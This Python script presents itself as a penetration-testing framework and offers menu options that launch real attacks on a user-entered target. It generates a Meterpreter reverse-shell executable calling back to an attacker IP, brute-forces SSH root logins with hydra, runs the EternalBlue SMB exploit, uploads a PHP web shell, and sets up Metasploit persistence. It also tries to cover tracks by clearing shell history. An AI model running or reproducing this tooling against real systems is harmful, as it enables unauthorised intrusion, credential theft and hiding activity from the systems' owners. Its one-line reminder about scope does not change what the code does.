######################################################################################################################################################################################################################
# Python script Penetration Testing & Ethical Hacking Framework, Note: Be mindful of the scope of work, & rules of engagement.
# python pt_framework.py.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################


import subprocess
import sys
import shutil
from datetime import datetime
from colorama import Fore, Style

# Helper Function to write output to a report
def write_to_report(content, section="General"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_path = "penetration_test_report.txt"
    formatted_content = f"\n{'='*60}\n[{timestamp}] [{section}]\n{content}\n{'='*60}\n"
    
    with open(report_path, "a") as report_file:
        report_file.write(formatted_content)
    print(f"{Fore.GREEN}Results written to {report_path}{Style.RESET_ALL}")

# Splash Screen
def display_splash_screen():
    splash = """
    _____ Penetration Testing Framework _____
    """
    print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")

# Check if tool is installed
def check_tool(tool_name):
    return shutil.which(tool_name) is not None

def install_tool(tool_name):
    if sys.platform.startswith("linux"):
        subprocess.run(["sudo", "apt-get", "install", "-y", tool_name])
    else:
        print(f"{Fore.RED}Automatic installation not supported on this OS.{Style.RESET_ALL}")

# Tool runner and output capture
def run_tool(command, section="General"):
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print(f"{Fore.GREEN}{result.stdout}{Style.RESET_ALL}")
        write_to_report(result.stdout, section)
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error executing {command}: {e.stderr}{Style.RESET_ALL}")
        write_to_report(f"Error executing {command}: {e.stderr}", section)

# Penetration Test Methodology
def display_methodology():
    methodology = """
    Penetration Testing Methodology:
    1. Reconnaissance and Information Gathering
    2. Scanning and Enumeration
    3. Gaining Access
    4. Setup Proxies
    5. Maintaining Access
    6. Covering Tracks
    7. Reporting
    """
    print(f"{Fore.CYAN}{methodology}{Style.RESET_ALL}")

# Reconnaissance and Information Gathering Tools
def run_reconnaissance_tools():
    print(f"{Fore.CYAN}Running Reconnaissance Tools...{Style.RESET_ALL}")
    reconnaissance_options = [
        "Nmap Scan",
        "Nikto Scan",
        "Return to Main Menu"
    ]
    for i, option in enumerate(reconnaissance_options, 1):
        print(f"[{i}] {option}")

    try:
        choice = int(input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}"))
        if choice == 1:
            target = input(f"{Fore.YELLOW}Enter target IP for Nmap scan: {Style.RESET_ALL}")
            nmap_command = ["nmap", "-sV", target]
            run_tool(nmap_command, section="Reconnaissance & Information Gathering")
        elif choice == 2:
            target = input(f"{Fore.YELLOW}Enter target URL for Nikto scan: {Style.RESET_ALL}")
            nikto_command = ["nikto", "-h", target]
            run_tool(nikto_command, section="Reconnaissance & Information Gathering")
        elif choice == 3:
            main_menu()
        else:
            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
            run_reconnaissance_tools()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        run_reconnaissance_tools()

# Scanning and Enumeration Tools
def run_scanning_tools():
    print(f"{Fore.CYAN}Running Scanning & Enumeration Tools...{Style.RESET_ALL}")
    target = input(f"{Fore.YELLOW}Enter target URL for Nikto scan: {Style.RESET_ALL}")
    nikto_command = ["nikto", "-h", target]
    run_tool(nikto_command, section="Scanning & Enumeration")

# Gaining Access Tools (Example: Hydra, MSFVenom)
def gaining_access_menu():
    print(f"\n{Fore.CYAN}Gaining Access:{Style.RESET_ALL}")
    options = [
        "Launch MSFVenom",
        "Brute Force with Hydra",
        "Exploit SMB with EternalBlue",
        "Web Shell Upload",
        "Return to Main Menu"
    ]
    for i, option in enumerate(options, 1):
        print(f"[{i}] {option}")

    try:
        choice = int(input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}"))
        if choice == 1:
            print(f"{Fore.YELLOW}Launching MSFVenom...{Style.RESET_ALL}")
            lhost = input(f"{Fore.YELLOW}Enter LHOST (attacker IP): {Style.RESET_ALL}")
            lport = input(f"{Fore.YELLOW}Enter LPORT (attacker port): {Style.RESET_ALL}")
            msfvenom_command = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", "payload.exe"]
            run_tool(msfvenom_command, section="Gaining Access")
        elif choice == 2:
            print(f"{Fore.YELLOW}Launching Hydra for brute force...{Style.RESET_ALL}")
            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
            hydra_command = ["hydra", "-l", "root", "-P", "/usr/share/wordlists/rockyou.txt", f"ssh://{target}"]
            run_tool(hydra_command, section="Gaining Access")
        elif choice == 3:
            print(f"{Fore.YELLOW}Exploiting SMB with EternalBlue...{Style.RESET_ALL}")
            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
            eternalblue_command = ["msfconsole", "-x", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"]
            run_tool(eternalblue_command, section="Gaining Access")
        elif choice == 4:
            print(f"{Fore.YELLOW}Web Shell Upload...{Style.RESET_ALL}")
            target = input(f"{Fore.YELLOW}Enter target URL: {Style.RESET_ALL}")
            # Example of web shell upload process
            web_shell_command = ["curl", "-X", "POST", f"{target}/upload", "-F", "file=@webshell.php"]
            run_tool(web_shell_command, section="Gaining Access")
        elif choice == 5:
            main_menu()
        else:
            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
            gaining_access_menu()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        gaining_access_menu()

# Proxy Setup (Example: Tor)
def setup_proxies():
    print(f"{Fore.YELLOW}Setting up Tor proxy...{Style.RESET_ALL}")
    tor_command = ["tor"]
    run_tool(tor_command, section="Setup Proxies")

# Maintaining Access (Example: persistence script)
def maintain_access():
    print(f"{Fore.YELLOW}Setting up persistence...{Style.RESET_ALL}")
    persistence_command = ["msfconsole", "-x", "use post/windows/manage/persistence; set SESSION 1; run"]
    run_tool(persistence_command, section="Maintaining Access")

# Covering Tracks (Example: clearing logs)
def cover_tracks():
    print(f"{Fore.YELLOW}Covering tracks...{Style.RESET_ALL}")
    log_clear_command = ["bash", "-c", "history -c && clear"]
    run_tool(log_clear_command, section="Covering Tracks")

# Reporting
def generate_report():
    print(f"{Fore.YELLOW}Generating full report...{Style.RESET_ALL}")
    with open("penetration_test_report.txt", "r") as file:
        print(file.read())

# Main Menu
def main_menu():
    display_splash_screen()
    print(f"{Fore.CYAN}Welcome to the Penetration Testing Framework!{Style.RESET_ALL}")
    options = [
        "Penetration Test Methodology",
        "Reconnaissance & Information Gathering",
        "Scanning and Enumeration",
        "Gaining Access Tools",
        "Setup Proxies",
        "Maintaining Access",
        "Covering Tracks",
        "Reporting",
        "Exit"
    ]
    for i, option in enumerate(options, 1):
        print(f"[{i}] {option}")

    try:
        choice = int(input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}"))
        if choice == 1:
            display_methodology()
            main_menu()
        elif choice == 2:
            run_reconnaissance_tools()
        elif choice == 3:
            run_scanning_tools()
        elif choice == 4:
            gaining_access_menu()
        elif choice == 5:
            setup_proxies()
        elif choice == 6:
            maintain_access()
        elif choice == 7:
            cover_tracks()
        elif choice == 8:
            generate_report()
        elif choice == 9:
            print(f"{Fore.RED}Exiting Penetration Testing Framework.{Style.RESET_ALL}")
            sys.exit()
        else:
            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
            main_menu()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
        main_menu()

if __name__ == "__main__":
    main_menu()
